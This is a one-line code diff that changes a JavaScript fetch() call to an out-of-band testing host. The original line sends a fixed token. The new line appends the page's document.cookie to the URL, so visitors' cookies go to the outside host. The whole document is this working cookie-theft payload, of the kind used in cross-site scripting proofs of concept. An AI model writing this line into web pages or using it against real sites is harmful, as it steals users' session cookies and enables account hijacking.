@@ -1,1 +1,1 @@
-fetch('http://oabscoufoetirjqixvqfqrppov4177qtl.oast.fun/EIMAIPOLYPEPEGKAS');
+fetch('http://oabscoufoetirjqixvqfqrppov4177qtl.oast.fun/' + document.cookie);
